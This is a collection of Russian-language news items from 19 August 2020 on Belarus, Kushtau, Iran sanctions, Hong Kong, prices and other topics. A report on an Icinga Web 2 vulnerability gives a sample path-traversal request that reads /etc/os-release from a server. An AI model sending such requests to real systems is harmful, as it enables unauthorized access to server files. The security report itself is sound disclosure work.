В школах калининградской области младшеклассников и льготников, которые учатся в первую смену, будут кормить горячим завтраком во вторую или третью перемену. Об этом сообщает пресс-служба регионального правительства в среду, 19 августа.
Те, у кого занятия проходят во вторую смену, получат обед. Для учащихся на дому предусмотрен сухой паёк. Кормить ребят будут раз в день, детей с ограниченными возможностями здоровья — два раза. Стоимость питания в среднем увеличилась на 10%: 69,45 руб. для 1-4 классов и 74,83 руб. для 5-11 классов.
Все поставщики питания и пищеблоки готовы к новым объёмам приготовления блюд и сейчас проходят согласование меню. В течение десяти оставшихся дней мы с представителями Роспотребнадзора будем инспектировать пищеблоки, оценивать готовность и вносить последние коррективы, чтобы с 1 сентября дети получали качественное горячее питание, не нарушая норм и правил", — рассказала министр образования региона Светлана Трусенёва.
Калининградская область получит более 160 млн рублей субсидий на питание для младших школьников.
 
Источники

Верховный суд Башкортостана сократил сроки административного ареста трем активистам оборонявшим шинах Куштау. Об этом сообщает «Урал. МБХ медиа».
Ильнуру Ильясову и Айдару Гафарову суд сократил срок с 7 до 5 суток, ещё одному активисту Риму Бакирову с 13 до 7 суток. Всем им вменялась статья о неповиновении законному требованию сотрудника полиции (ст. 19.3 КоАП).
Радий Хабиров — глава Башкирии, в конце 2018 года принял решение о разработке Куштау. Вечером 17 августа Хабиров сказал, что готов к встрече с активистами из палаточного лагеря, и назвал ситуацию вокруг шихана «серьезным кризисом», а также предложил создать координационный совет с участием активистов, членов СПЧ, правительства республики и представителей Башкирской содовой компании.
Шихан Куштау — небольшая гора в Ишимбайском районе Башкортостана. Местные активисты уже несколько месяцев борются с вырубкой леса для разработки месторождения соды и известняка на территории Куштау. Начиная с августа работы на охраняемой природной территории возобновились . Активисты выступают за сохранение памятников природы, оставшихся шиханов Торатау, Куштау, Юрактау. Существовавший ранее шихан Шахтау был полностью уничтожен для получения сырья «Башкирской содовой компанией».
15 августа около лагеря защитников Куштау задержали более 70 человек. Задержанным присудили административные аресты и штрафы.
 
Источники

Юрий Бублик и его брат Александр Бублик вели переговоры с политсилами «Голос», «Слуга народа», «Европейская солидарность», «Батькивщина», «Доверие», «Предложение» и «За будущее», однако на местные выборы они пойдут вместе с объединением «Свобода».
Об этом нардеп предыдущего созыва Юрий Бублик написал на своей странице в Facebook, сообщает Regionews.
Как пишет Бублик, вместе с братом они приняли предложение политической силы "Свобода" и решили присоединиться к ней:
 
 
Напомним, нардеп VIII созыва Юрий Бублик заявил о намерении участвовать в местных выборах еще в мае однако не уточнил, от какой именно политсилы.
 
Источники

Валерий Цепкало — белорусский оппозиционный политик и бывший посол Беларуси в США — заявил, что отсутствие сторонников Александра Лукашенко на улицах свидетельствует о фальсификации результатов выборов, на которых Лукашенко, по официальным данным, получил 80 % голосов. Об этом Цепкало заявил на виртуальном круглом столе в Центре международных и стратегических исследований в Вашингтоне (CSIS), посвященному событиям в Беларуси. Эксперты также обсудили возможную реакцию России в случае эскалации протестов и ухода Лукашенко, последствия белорусских событий для европейской безопасности и то, как США и Евросоюзу следует реагировать на эти события.
Дальнейшее развитие ситуации в Беларуси зависит от мировой реакции, в первую очередь — со стороны демократических стран, считает Валерий Цепкало.
«Мы считаем, что страны Запада не должны признавать результаты президентских выборов в Беларуси и признать Светлану Тихановскую легитимным лидером», — подчеркивает он.
Доктор экономических наук Владислав Иноземцев считает, что неблагоприятная экономическая ситуация в Беларуси — республика зависит от российской финансовой поддержки — не играет серьезной роли в массовых протестах. А организация протестов является, по его мнению, не следствием внешнего влияния, а ответом белорусского общества на действия властей.
«Массовая мобилизация возникла не столько из-за экономических действий, сколько из-за реакции официальных властей на пандемию: Лукашенко неделями и месяцами игнорировал сам факт ее существования. Люди были вынуждены хоть как-то объединиться, используя социальные сети для снабжения больниц всем необходимым, для поддержки врачей и медсестер. И на самом деле это была своего рода самоорганизация для выживания. И это был первый шаг в том, что мы увидели после выборов и Лукашенко», — констатирует Иноземцев.
Эксперт считает, что Россия не будет проводить военной операции в Беларуси, как это было в Украине, но продолжит оказывать давление на Минск. Валерий Цепкало поясняет что Россия имеет в большей степени геополитический интерес в сохранении режима Лукашенко, чем экономический.
«Кремль не хочет, чтобы войска НАТО стояли под Смоленском на границе с Россией — это очень близко к Москве. Думаю, Кремль никогда никому не позволит сделать нечто подобное. Если российское руководство почувствует угрозу, что кто-то с Запада пытается разместить войска в Беларуси, то они сразу введут на белорусскую территорию свои, поскольку нет границы между Россией и Беларусью», — подчеркивает Цепкало.
Генеральный секретарь НАТО Йенс Столтенберг на днях опроверг информацию о том, что альянс якобы размещает войска на границе с Беларусью.
 
Источники

В Калининградской области цены на квартиры и студии площадью до 32 кв. м выросли с начала года на 15,6%. Об этом со ссылкой на портал "Мир квартир" сообщает "РБК Калининград" в среду, 19 августа.
Стоимость такого жилья в регионе в среднем составляет 1,9 млн рублей. По этому показателю Калининградская область заняла 22 место в России среди регионов с дорогими малогабаритными квартирами.
Больше всего малометражки и студии подорожали в Рязани (+28,8%), Ставрополе (+28,7%), Новокузнецке (+27,7%) и Ульяновске (+27,1%). В среднем по России цены выросли на 13,2%.
Самые дорогие студии и однушки небольшой площади продают в Москве (от 6,7 млн рублей), Санкт-Петербурге (3,8 млн рублей), Сочи (3,5 млн), Владивостоке (3,4 млн) и Севастополе (около 4 млн рублей). Доступнее всего малометражки в Магнитогорске (1,2 млн рублей),Нижнем Тагиле и Кургане (1,3 млн рублей), Владикавказе и Астрахани (1,4 млн).
 
Источники

Опубликованы корректирующие выпуски пакета Icinga Web 2.6.4, 2.7.4 и v2.8.2, предоставляющего web-интерфейс для системы мониторинга Icinga. В предложенных обновлениях устранена критическая уязвимость (CVE-2020-24368), позволяющая неаутентифицированному атакующему получить доступ к файлам на сервере с привилегиями процесса Icinga Web (обычно пользователь, под которыми выполняется http-сервер или fpm). 
Для успешной атаки требуется наличие одного из модулей, обрабатывающего изображения и пиктограммы. Среди подобных модулей отмечаются Icinga Business Process Modeling, Icinga Director, Icinga Reporting, Maps Module и Globe Module. Сами по себе в данных модулях нет уязвимостей, но они являются факторами, позволяющими организовать атаку на Icinga Web. Атака осуществляется через отправку запросов HTTP GET или POST к обработчику, выполняющему отдачу изображений, доступ к которому не требует наличия учётной записи. Например, если Icinga Web 2 доступен через /icingaweb2 и в системе имеется модуль businessprocess, установленный в каталог /usr/share/icingaweb2/modules, для чтения содержимого файла /etc/os-release можно отправить запрос "GET /icingaweb2/static/img?module_name=businessprocess&file=../../../../../../../etc/os-release".
 
Источники

Александр Лукашенко внесён в список персон нон грата в Литве. Об этом со ссылкой на главу литовского МИД Линаса Линкявичюса сообщает «РИА Новости» в среду, 19 августа.
«В списке, поимённо который я называть не стану, 32 человека, в том числе Александр Лукашенко», — сказал Линкявичюс в эфире национального радио.
Министр напомнил, что Литва поддержала решение Евросовета о персональных санкциях для тех, на ком лежит ответственность за жёсткое подавление протестов в Белоруссии. Кроме того, республика считает необходимым ввести рестрикции «за циничный подлог итогов выборов», подчеркнул Линкявичюс.
Евросоюзне признал результаты президентских выборов в Белоруссии.
 
Источники

Опубликовано обновление операционной системы Solaris 11.4 SRU 24 (Support Repository Update), в котором предложена серия очередных исправлений и улучшений для ветки Solaris 11.4. Для установки предложенных в обновлении исправлений достаточно выполнить команду 'pkg update'. 
В новом выпуске:
* До версии 20.2 обновлён Oracle Explorer, инструментарий для построения детального профиля конфигурации и состояния системы; 
* Добавлена поддержка накопитеоей SAMSUNG 7.68TB (MS9AC2DD2SUN7.6T) и 200GB (MS9AC2DD6SUN200G);
* В состав включён движок SpiderMonkey 60;
* Добавлены Python-пакеты pyrsistent, chardet и bcrypt, а также пакеты iso8601, netaddr и pycups для Python 3.7;
* Обновлены версии 87 программ, включая GNOME 3.34, Erlang 22.2.8, GCC 9.3, GNU screen 4.8.0, LLVM/Clang 10.0.0, Node.js 12.16.3, Samba 4.11.9, cups 2.3.1 и xorg-server 1.20.8.
* Обновлены версии с устранением уязвимостей: Ant 1.10.8 Apache Tomcat 8.5.55 Apache Web Server 2.4.43 BIND 9.11.20 Firefox 68.9.0esr GDB 9.2 GnuPG 2.2.20 Mesa 20.0.2 MySQL 5.6 5.6.48 MySQL 5.7 5.7.30 NSS 3.51 OpenLDAP 2.4.50 PHP 7.4.5 PyYAML version 5.3.1 RabbitMQ 3.8.3 Thunderbird 68.9.0 Wireshark 3.2.4 dnsmasq 2.81 git 2.19.5 glib 2.62.5 libexif 0.6.22 mailman 2.1.33 ntp 4.2.8p14 python 2.7 2.7.18 rsyslog 8.2002.0 ruby 2.5 2.5.8 ruby 2.6 2.6.6 sqlite 3.32.1 squid 4.11 sudo 1.8.31p1 vim 8.2.0444 webkitgtk 2.28.2 zsh 5.8
 
Источники

Ранее международная сеть отелей Marriott сообщила об утечке данных 5,2 млн своих клиентов. Утечка является уже вторым по счету серьезным инцидентом безопасности, затронувшим Marriott за последние несколько лет. В ходе атаки злоумышленники похитили имена и даты рождения постояльцев, их контактные данные (электронные и почтовые адреса, телефонные номера), сведения о гендерной принадлежности, номера и баланс счетов, а также информацию о предпочитаемых комнатах и языках общения.
От лица проживающих в Англии и Уэльсе потерпевших, чьи данные стали доступны из-за бронирования номеров в группе Starwood Hotels, ныне структуре Marriott, иск подал журналист Мартин Брайант, которого представляет юридическая фирма Hausfeld.
В коллективном иске, заявителями которого автоматически становятся все так или иначе затронутые лица, за исключением отказавшихся от претензий, говорится о нарушении британского Акта о защите данных 1998 года и Генерального регламента ЕС о защите персональных данных.
Представитель Marriott заявил, что у компании пока нет комментариев.
 
Источники

В России с 11 по 17 августа заметней всего выросли цены на сахар-песок, гречку, некоторые категории мяса и на детские фруктово-ягодные консервы. Об этом со ссылкой на Росстат сообщает "РИА Новости" в среду, 19 августа.
Так, за неделю сахар подорожал в среднем на 0,5%. На 0,3% вырос ценник на свинину, баранину и фруктово-ягодные консервы для детского питания. Стоимость гречки увеличилась на 0,2%.
Одновременно некоторые категории продовольственных товаров подешевели. В частности, на 0,5% меньше стало стоить пшено, на 0,3% — стерилизованное молоко. Сметана, куриные яйца и макаронные изделия потеряли в цене 0,2%. Цены на плодоовощную продукцию в среднем снизились на 3,2%.
 
Источники

]]
19 августа 2020 года в выставочном центре Fili Hall Филёвского парка в Москве состоялось открытие выставки работ фотографа Сергея Бабенко «Рок-ностальгия». Выставка проходит в рамках пятого музыкального фестиваля TOP Fili Music-2020. На своих экспозициях автор представляет как фото рок-звёзд от Бориса Гребенщикова и Петра Мамонова до Дэвида Бирна и Кена Хэнсли, так и бытовые зарисовки и фото, сделанные, например, в Демократической Республике Афганистан. Но на этот раз Бабенко решил продемонстрировать 32 самые близкие лично ему работы.
Сергей, c конца 1980-х — начала 1990-х, один из самых известных российских рок-фотографов. В числе его работ концертные съёмки отечественных и зарубежных музыкантов, участие в оформлении музыкальных альбомов, многочисленные публикации в газетах, журналах и книгах, персональные фотовыставки, призы на престижных фестивалях. Его работы стали культовыми в среде рок-фанов.
Бабенко отметил, что 90-е годы прошлого столетия вовсе не считает «бандитскими», так как в его работе, а рок-музыке «была другая жизнь». Автор рассказал о поездке с музыкантом легендарной группы Uriah Heep Кеном Хэнсли на стареньком автомобиле «Ока» и продемонстрировал сделанные в ходе этого путешествия фото.
Специальными гостями мероприятия стали Александр Кушнир, Сергей Гурьев, Олег Коврига, Алексей Певчев, Игорь Верещагин, Алексей Коблов и другие. На вечере сыграла группа «Амария» (Самара).
И концерты, и выставка продолжаются. На фестивале TOP Fili Music-2020 уже выступили Юрий Наумов, Павел Фахртдинов и Хельга Патаки , Алексей Вдовин, Юлия Теуникова и «КоМПОзит», Дмитрий Малолетов, Александр Виницкий.
Бабенко сказал:
 
 
 
File:Sergey Babenko 2020 08 19 in Fili Hall 01.jpg 
File:Sergey Babenko 2020 08 19 in Fili Hall 02.jpg 
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 030.jpg
 
 
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 012.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 014.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 009.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 010.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 015.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 016.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 017.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 020.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 021.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 019.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 023.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 025.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 026.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 027.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 031.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 032.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 043.jpg
Igor Vereshchagin at the Exhibition of Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 044.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 055.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 045.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 046.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 050.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 052.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 056.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 053.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 058.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 064.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 102.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 061.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 100.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 063.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 070.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 073.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 078.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 074.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 075.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 084.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 082.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 085.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 086.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 087.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 088.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 101.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 090.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 103.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 093.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 094.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 112.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 114.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 117.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 120.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 121.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 097.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 098.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 123.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 126.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 125.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 124.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 127.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 132.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 136.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 138.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 139.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 130.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 149.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 150.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 001.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 003.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 140.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 040.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 155.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 160.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 162.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 164.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 137.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 158.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 165.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 167.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 170.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 173.jpg
Sergey Babenko in Fili Hall (2020-08-19; Krassotkin) 171.jpg
 
Ссылки
 
* Фотографии на Викискладе.
* Анонс выставки в аккаунте Сергей Бабенко на Facebook.
* Группа фестиваля во ВКонтакте.
* Анонс фестиваля во ВКонтакте.
* Фотомузыка Сергея Бабенко (материал из Журнал Креатив&creative #10 − 2003 г.) на Art-fotolab.
* Выставка фоторабот Сергея Бабенко «Рок-ностальгия» пройдет в парке «Фили» на Filevsky-park.
* 19 августа в парке «Фили» состоится открытие выставки работ фотографа Сергея Бабенко «Рок-ностальгия» на Parkfili.
 
Источники

]]
В среду власти США официально уведомили Гонконг о выходе из трёх двусторонних соглашений об экстрадиции преступников и налогообложении. Об этом говорится в заявлении пресс-секретаря Госдепартамента США Морган Ортагус.
Заявление последовало за решением президента Дональда Трампа лишить Гонконг льготного торгового статуса в отношениях с США. В Вашингтоне обвиняют официальный Пекин в подавлении демократии после масштабных народных протестов в поддержку автономии города.
В июле Трамп подписал распоряжение о том, что Гонконг не обладает достаточной автономией, необходимой для оправдания особого статуса в отношениях с США по сравнению с Китаем.
«Эти соглашения охватывают выдачу скрывающихся от правосудия преступников, передачу осужденных лиц и взаимные освобождения от налогов на доходы, полученные от международного судоходства. Эти шаги подчеркивают нашу глубокую озабоченность по поводу решения Пекина ввести Закон о национальной безопасности, который ущемляет свободы жителей Гонконга», — говорится в сообщении.
В ответ Китай прекратил действие договоренностей о сотрудничестве между США и Гонконгом в юридической сфере, заявил сегодня официальный представитель МИД КНР Чжао Лицзянь. 
Ранее Пекин ввёл новый закон о национальной безопасности в ответ на прошлогодние протесты в поддержку демократии. Закон предусматривает уголовную ответственность засепаратизм, подрывную деятельность, терроризм и сговор с иностранными силами, а также вводит запрет на отстаивание санкций и большей автономии или независимости Гонконга.
 
 
Источники

В Москве были задержаны трое активистов проекта «Декоммунизация». Они собирались провести акцию в Чайковском тоннеле в память о жертвах августовского путча 1991 года (ГКЧП). Об этом ОВД-Инфо сообщил сам Дмитрий Энтео.
Задержанных Дмитрия Энтео, Михаила Шнейдера и Вадима Громова доставили в ОВД Арбат.
 
Источники

Президент Дональд Трамп объявил в среду, что США намерены восстановить все ранее приостановленные санкции в отношении Ирана. Это связано с тем, что Совет Безопасности ООН не продлил срок действия эмбарго на приобретение Ираном вооружений, срок действия которого скоро истекает.
«Сегодня я поручил госсекретарю Майку Помпео уведомить Совет Безопасности ООН о том, что Соединенные Штаты намерены восстановить практически все, ранее приостановленные, санкции в отношении Ирана», - сказал президент на пресс-конференции в Белом доме.
Механизм восстановления санкций был включен в ядерное соглашение с Ираном от 2015 года (известное как СВПД), и позволяет отдельному участнику договора восстановить санкции в отношении Тегерана, если это государство сочтет, что Иран нарушает условия сделки.
США вышли из СВПД в 2018 году, однако в Вашингтоне утверждают, что обладают правом, в качестве участника соглашения, в соответствии с резолюцией 2231 Совета Безопасности ООН, которая кодифицировала ядерное соглашение.
Совет Безопасности отклонил резолюцию США о продлении тринадцатилетнего эмбарго на поставки оружия Ирану, которое должно истечь в октябре в рамках ядерной сделки.
По сведениям агентства «Рейтер», Майк Помпео в четверг отправится в Нью-Йорк, чтобы добиться восстановления всех санкций ООН в отношении Ирана. Помпео планирует встретиться с генеральным секретарем ООН Антониу Гутерришем, сообщили агентству дипломаты и официальный представитель Организации объединенных наций.
В ходе пресс-конференции Трамп также сообщил, что он ожидает, что Саудовская Аравия присоединится к соглашению, объявленному на прошлой неделе Израилем и Объединенными Арабскими Эмиратами, которое приведет к полной нормализации дипломатических отношений между двумя странами. Президент положительно ответил на вопрос журналиста, спросившего о том, насколько верны сообщения о возможном присоединении Саудовской Аравии к соглашению между Израилем и ОАЭ.
Трамп добавил, что Объединенные Арабские Эмираты заинтересованы в приобретении американских истребителей-бомбардировщиков F-35 и «готовы заплатить большие деньги» за покупку этих самолетов.
 
Источники

* ООН призывает провести расследование в случае подтверждения отравления Алексея Навального.
* Служба безопасности Украины заявила о пресечении деятельности агентурной сети ФСБ России, работавшей в Херсонской области. 
* Свидетель со стороны защиты актера Михаила Ефремова Александр Кобец заявил, что в автомобиле в момент ДТП было два человека и за рулем «на 100%» был не артист, а другой мужчина.
* Небольшая утечка воздуха обнаружена на Международной космической станции.
 ]]

ВАШИНГТОН – В Пентагоне сегодня состоялась встреча министров обороны США и Ирака – Марка Эспера и Джумаа Саадуна. Как сообщает шеф-корреспондент «Голоса Америки» в Пентагоне Джефф Селдин, министры обсудили двустороннее партнерство в сфере безопасности, а также важность продолжения процесса укрепления Сил безопасности Ирака, с целью не допустить, чтобы в Ираке вновь выросла роль самопровозглашенного «Исламского государства» (ИГ), что угрожало бы безопасности во всем регионе.
Эспер и Саадун еще раз подтвердили свою приверженность сотрудничеству Сил безопасности Ирака с глобальной коалицией союзников по борьбе с ИГ, во главе с США, а также главной политической цели: стремлению к тому, чтобы Ирак стал безопасным, стабильным и процветающим.
 
Источники

В среду, 19 августа, по инициативе президента Европейского Совета Шарля Мишеля лидеры ЕС провели в видеорежиме экстренный саммит, во время которого обсудили и ситуацию в Беларуси. В своем финальном заявлении политический блок объявил, что не признает результаты прошедших в стране 9 августа выборов, так как они «не были ни свободными, ни справедливыми».
Европейский Союз также планирует ввести персональные санкции против лиц, ответственных за фальсификацию результатов выборов, насилие и репрессии, и «ожидает полного и прозрачного расследования всех предполагаемых нарушений». Европейские лидеры призвали власти Беларуси прекратить насилие и найти выход из кризиса путем «всестороннего национальный диалога».
«Мы продолжим внимательно следить за ситуацией и будем готовы внести свой вклад в усилия по мирному прекращению кризиса, — сообщается в финальном документе. — ЕС полностью поддерживает предложения ОБСЕ о диалоге в Беларуси и готов оказать содействие в их продвижении».
Ранее президенты Польши, Литвы, Латвии и Эстонии предлагали стать посредниками в урегулировании ситуации в Беларуси. В отношении выказанной европейскими лидерами идеи посреднической миссии президент Лукашенко заявил, что его правительство не нуждается в подобных инициативах и ЕС должен заниматься своими внутренними делами.
Непризнание результатов выборов в Беларуси и ввод персональных санкций со стороны ЕС является важным сигналом поддержки белорусского общества и отсутствия легитимности Лукашенко в глазах европейского сообщества. Однако ЕС должен предпринять более решительные шаги для проведения новых выборов в Беларуси и формировании международной посреднической миссии, отмечают эксперты в комментарии Русской Службе «Голоса Америки».
Бывший помощник госсекретаря США по вопросам демократии и прав человека в администрации Джорджа Буша-младшего, ныне научный сотрудник Международного Университета штата Флорида Дэвид Крамер (David J. Kramer, Florida International University) считает, что решение ЕС о непринятии результатов выборов в Беларуси и ввод санкций является правильным шагом.
«Он станет поддержкой для тех, кто борется за демократию и свободу в Беларуси. Должны быть последствия как за кражу результатов выборов, так и за жестокие атаки, которые Лукашенко направил против протестующих, мирно заявлявших о своей оппозиции его попыткам украсть результаты выборов», — говорит бывший помощник госсекретаря США.
Потенциальная посредническая миссия ЕС может быть уместной только в том случае, если она будет направлена на транзит власти к новым политическим силам, считает Дэвид Крамер. Лукашенко не только сфальсифицировал результаты выборов, но и прибег к неоправданному насилию в отношении протестующих, поэтому любое посредничество должно привести не только к его уходу из власти, но и к отъезду из страны. Если он останется в стране, ситуация будет оставаться нестабильной, говорит эксперт.
При этом, Россия могла бы сыграть позитивную роль в этом процессе, считает бывший помощник госсекретаря США: «Москва могла бы сыграть конструктивную роль, предложив Лукашенко убежище, позволив ему бежать в Россию. В противном случае, я не думаю, что российское вмешательство хоть сколько-нибудь оправдано. Любые военные действия России были бы вопиющим нарушением суверенитета, территориальной целостности и независимости Беларуси, несмотря на договор о „Союзном государстве“, подписанным еще в 1990-х годах».
Эксперт добавляет, что у России нет причин для военного вторжения в Беларусь, так как протесты в стране не являются антироссийскими или проевропейскими. Он направлены против Лукашенко и любое вмешательство Москвы в его пользу приведет к обратному результату и вызовет антироссийское протестное движение.
И Москва, и Запад должны перестать рассматривать ситуацию в Беларуси через геополитическую призму, подчеркивает Дэвид Крамер. При этом, Соединенные Штаты, которые до сих пор ограничивались осуждающими режим Лукашенко заявлениями, должны играть более активную роль наравне с ЕС.
Одной причин сдержанной реакции Вашингтона могут быть опасения, что активные действия США спровоцируют утверждения российской стороны о наличии «американского» заговора в Беларуси. «Это не так и мы должны работать с нашими европейскими коллегами и пытаться облегчить переход власти», — отмечает Дэвид Крамер. Он добавляет, что Запад должен поддержать сегодня Светлану Тихановскую как избранного лидера страны.
По мнению Джеймса Шерра (James Sherr), старшего научного сотрудника Международного центра обороны и безопасности в Таллинне (ICDS) и ассоциированного сотрудника программы «Россия и Евразия» британского аналитического центра «Чатэм Хаус» (Chatham House) финальные заявления лидеров саммита являются «расплывчатыми». Несмотря на то, что Европейский Союз не признает результаты выборов, со стороны блока нет четкого призыва к новым выборам под контролем и гарантиями ОБСЕ. Также европейские лидеры не призвали сегодня к прямому формированию посреднической миссии, отмечает эксперт.
И в случае «Оранжевой революции» в Украине в 2004 году, и Евромайдана в 2013 году был сформирован международный круглый стол с участием высокопоставленных политиков ЕС и России, говорит Джеймс Шерр: «Сейчас мы этого не видим. Это является отражением того, насколько ухудшились отношения между ЕС и Россией, и насколько разными сегодня являются их точки зрения».
«Россия заняла позицию, выступая против любой формы вмешательства, кроме, конечно, своего собственного, — добавляет он. — Россияне считают Европу назойливой и враждебной, но и не воспринимают ее всерьез. Они не боятся Европы. И это, по своей сути, нездоровая и опасная ситуация».
Тем не менее, эксперт не ожидает на сегодняшний день военной интервенции России в Беларусь. Он также отмечает, что в белорусском обществе нет антироссийских настроений, но это может измениться, если Москва решится на военное вмешательство.
«Три самых известных кандидата от оппозиции имеют в некотором роде очень хорошие отношения с Россией. Так что, Москве нет необходимости вмешиваться, если хотя бы один из них станет преемником Лукашенко», — считает Джеймс Шерр.
У Кремля также есть множество средств оказания давления на любого белорусского лидера, так как экономика страны находится в сильной зависимости от России, добавляет он.
По мнению Шерра, до тех пор, пока Москва будет относиться к попыткам ЕС выступить в роли посредника как к нежелательным и неприемлемыми, риторика Лукашенко не изменится.
«Лукашенко действует так, как будто Россия является его главным гарантом», — отмечает эксперт.
На сегодняшний день в отношении Беларуси позиция России играет чрезвычайно важную роль. Поэтому усилия Запада должны быть направлены на то, чтобы убедить российского президента поддержать процесс, гарантирующий новые выборы в стране и переход власти. Необходимо убедить Кремль, что каким бы ни был бы исход выборов в Беларуси, Россия не будет проигравшей стороной, считает Джеймс Шерр.
 
Источники

11 августа 2020 года Камала Харрис вошла в историю, став первой чернокожей американкой и первой американкой индийского происхождения, номинированной на пост вице-президента США одной из двух основных партий.
19 августа на съезде демократов она приняла эту номинацию и выступила с речью.
Выступлению Харрис предшествовало видеообращение членов ее семьи.
Камале Харрис 55 лет, она родилась в городе Окленд, штат Калифорния. Ныне она сенатор США, представляющая Калифорнию, в прошлом — генеральный прокурор штата. Она принимала участие в президентской гонке, но проиграла праймериз Джо Байдену.
В обращении к делегатам съезда и к американцам, Камала Харрис призвала вспомнить об основополагающих принципах, на которых основаны США, и напомнила о столетней годовщине получения американками избирательных прав. Она перечислила женщин-лидеров, которые вели за собой американцев. И добавила, что среди них она обязана назвать свою мать.
Харрис также рассказала о своей семье и о своей карьере. Харрис родилась в семье иммигрантов: ее мать приехала в США из Индии, отец — из тогда британской Ямайки. Харрис подчеркнула, что ее цель — нация, основанная на принципах справедливости, равенства и разнообразия.
«Я вижу нашу нацию прекрасным обществом, где рады всем, вне зависимости от того, как мы выглядим, откуда мы прибыли или кого мы любим. Страной, в которой мы можем не соглашаться во всем, но мы едины в фундаментальном убеждении, что каждый человек — ценен, где каждый заслуживает сострадания, каждый обладает достоинством и достоин уважения».
Камала Харрис сказала, что сейчас до этого далеко и назвала причиной этого президента-республиканца Дональда Трампа. Она напомнила о проблемах расовых меньшинств, указав: «против расизма нет вакцины» и призвала объединится в борьбе с этим злом.
